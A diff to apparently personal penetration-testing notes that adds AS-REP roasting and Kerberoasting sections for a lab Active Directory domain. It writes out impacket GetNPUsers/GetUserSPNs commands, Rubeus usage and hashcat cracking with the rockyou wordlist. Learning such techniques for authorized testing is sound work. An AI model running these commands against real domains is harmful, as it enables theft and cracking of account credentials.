@@ -661,7 +661,7 @@ To manage multiple computers at once we make one head computer which is called d
 
 These are some tips on active directory during pentesting:
 
-* if you see 88 which is kerbers port and you can straight up tell that it is DOMAIN CONTROLLER.
+* if you see 88 which is kerberos port and you can straight up tell that it is DOMAIN CONTROLLER.
 * Start with smb enumeration because its quick.
 * 5985 port is winrm. Think of it like ssh but in powershell, no need to focus in it either personally just used for authentication if you find the credentials.
 * In AD finding usernames is just as good as finding passwords because they can be used for AS-REP roasting.
@@ -737,21 +737,54 @@ SMB         192.168.50.75   445    CLIENT75         [+] corp.com\dave:Flowers1 (
 ```
 
 
-
-
-
-
-
-
-
 ## AS-REP Roasting
 
 This is related to how kerberos works, in active directory all the users are setup to require pre-authentication.
 
-There are some accounts that does not require pre-authentication like service accounts.
+There are some accounts that does not require pre-authentication like service accounts or any other account.
+
+To find them we can use impacket-GetNPUsers
+
+```shell
+impacket-GetNPUsers -dc-ip 192.168.120.70 -request -outputfile hashes.asreproasting corp.com/pete
+```
+
+this will generate the hash for the user that does not require pre-authentication in kerberos and then you can crack it with hashcat.
+
+```shell
+hashcat -m 18200 hashes.asreproasting /usr/share/wordlists/rockyou.txt
+```
+
+If we want to do it on the windows box which we pawned then we can do it with the help of Rubeus.exe by running the following command on powershell or cmd:
+
+```Rubeus.exe asreproast``
 
 
-## AD Exploitation
+## Kerberoasting
+
+The cool thing about kerberoasting is that you don't need any unique privillege. If you have any level of access you can perform kerberoasting.
+
+So basically kerberoasting is finding out the service accounts and getting the TGS from the domain controller to use that service.
+
+We can run impacket to find all the service accounts on the domain.
+
+```shell
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+```
+
+This will return the TGS and you will get the hash and then you can crack it with hashcat as usual.
+
+```shell
+sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+You can similarly use Rubeus to crack it on the windows machine if you have access to rdp session.
+
+
+# Active Directory lateral movement
+
+This secion is basically all the scripts which will help with what to do with the credentials we get.
+
 
 
 
